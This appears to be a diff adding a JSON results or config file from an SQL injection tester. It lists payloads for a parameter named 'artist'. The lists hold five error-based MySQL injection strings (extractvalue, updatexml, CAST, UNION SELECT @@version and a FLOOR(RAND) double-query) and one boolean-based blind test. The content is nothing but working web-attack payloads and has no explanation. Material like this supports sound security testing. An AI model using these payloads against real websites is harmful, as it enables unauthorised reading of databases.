@@ -1,0 +1,34 @@
+{
+  "artist": {
+    "error": [
+      [
+        "Error-Based",
+        "' AND extractvalue(1,concat(0x7e,version())) #"
+      ],
+      [
+        "Error-Based",
+        "' AND updatexml(1,concat(0x7e,version()),1) #"
+      ],
+      [
+        "Error-Based",
+        "' AND 1=CAST(version() AS INT) #"
+      ],
+      [
+        "Error-Based",
+        "' UNION SELECT @@version #"
+      ],
+      [
+        "Error-Based",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) #"
+      ]
+    ],
+    "union": [],
+    "time": [],
+    "blind": [
+      [
+        "Boolean-Based",
+        "' AND '1'='1' / '1'='2"
+      ]
+    ]
+  }
+}
